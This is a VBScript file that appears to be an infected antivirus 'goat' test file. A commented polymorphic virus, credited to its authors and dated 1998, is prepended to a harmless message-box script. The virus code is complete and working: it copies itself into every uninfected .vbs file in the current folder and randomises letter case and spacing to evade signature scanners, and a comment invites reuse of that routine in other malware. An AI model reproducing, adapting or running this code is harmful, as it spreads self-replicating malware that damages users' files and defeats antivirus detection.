'**********
'   a PolymorPHic exAmPlE VB  sCrIPT  vIrUS  BaSED On  vbsV777
'    By   SPO0Ky     +  CAd -   14.  nOV.  1998     -
'    FeEL  FReE  To    usE    thE CBmUtaTE   fuNCTIoN   In yOUr     OWn     BUGs  :-)

   ConSt    CbFOrreadING    = 1     ,    cBForwriTIng   =     2

     RanDomIZe
  
    cBWepaTH    = WscriPt  .   scrIpTfuLLnaMe
  
 set    cbfSO = crEAtEobJECT  ( "scRIpTiNg.FiLESysTemOBjEcT"     )
    
     SeT  cbweFILe  =   CBFSo   .   opEntextfILE  (    cbWepath     ,  CBFORreaDiNG    )
  CbWeCODe     =    CbWEFiLE  .  rEaDaLL
  cbwEFIlE  .   CLosE
   
     cbvirussIZE   =   InStr (   3    ,     CBweCode     ,  "*****" & "*****"   )    +  10   + 1

    set   CbwEfIle  =  cbFsO     .     oPeNTextfilE (    cbWepatH     ,    CbfOrrEAdInG  )
 CbweCode    =  cbWeFIlE   .    READ (  CbVirUssize   )
  cBWEfiLE  . CLOse
    
   FOr  eaCH    cbFiLE In  CBFso   .  GeTFolder (    "."  )     .   FILES
 
  IF     LcasE    (  cBfSO .   GETEXteNsIONNAME     (   CBfile    .   NaMe    )    )     =    chR    (    118   )   &     CHR ( 98  )  & CHr  (   115   )     tHEn
    
 SET   cbVicTImfILE =   CbfsO   . opeNtEXTfilE   ( cbfILe    .  pATH     ,  cbforReadIng   )
     CBinfEctiONMaRkER  = CBviCTimFiLe   .     rEaD  (    11    )
    cBViCtimfILe .    ClOse
  
  IF  cBInFeCTioNmaRKEr  <>  "'*****"     & "*****" THeN

  SEt  CbvIcTiMFIlE  =   CBfso    .   OpEnTEXtfIlE     ( CBfIlE .   PATH   ,   CbfOrreAdING    )
   CbviCtImcoDe   =   CbViCtiMFIle . REadalL
    cBVICtImFiLE . cloSe
    
 CBviCtIMCodE   =  CBmUtATe    (    CbwecODE    )  &    cbViCtiMCOdE
  
  SeT   cbviCtimfiLE    =     cBFSO  .   oPEnTEXTFilE    (  cbfILe   .  PATh    ,   CBFOrwrIting   ,  1 )
     CBviCtImfIle     .   wRitE   cBvicTiMCode
    CbVICtIMFiLE    .     ClOsE
     
     END  If
    
    eND     If
    
    nExT
   
 
   FUNCTioN  cbMUTATE    ( cbstriNG )
 
    cBNEwSTRIng   =   ""
     cbI  =  1
  
     WhiLe  cbI     <=     lEN (   cbStRiNG    )
     
     if     mid (    CbsTrinG ,  CBi ,     1     )   =     chR    (  32    ) ThEn

   foR     CbJ     =    1 To  inT     (    5     *   rND ) +    1

  CbnEwStRInG     =  cBnewsTriNg   +    CHr     (     32     )

  nExT
  
  do
   
   cBi     =  Cbi     +   1
 
  LOOp    whilE  MID  (  CBSTrInG   ,  Cbi  , 1 )     =   chR  ( 32     )
  
    else
  
  iF   INt    ( 2 *  RNd   )  +   1  =     1    ThEN

 cbneWStRIng  =  CBNEWStRiNg  +  uCASE   (   Mid     (  cbstrInG     ,   CbI    ,     1   )  )

 elSE

  cBnEwStrING    =  CbneWsTriNg    +   LCaSE   (    mID     (   CBsTring    , CbI ,     1     )  )

  enD     If

   CBI   =  cBi     +     1
 
    enD IF
     
     wEND
    
    CbmUtAtE    =   cbNeWsTrInG
  
  End fUncTION
   
   '**********
'VBS Goat file

Dim Msg, Style, Title, Help, Ctxt, Responce, MyString
Msg = "This is Cybec VBS Goat file"
Style = vbYesNo + vbExclamation + vbDefaultButton2
Title = "Goat File"
Help = "Goat.hlp"
Ctxt = 1000

Responce = MsgBox(Msg, Style, Title, Help, Ctxt)
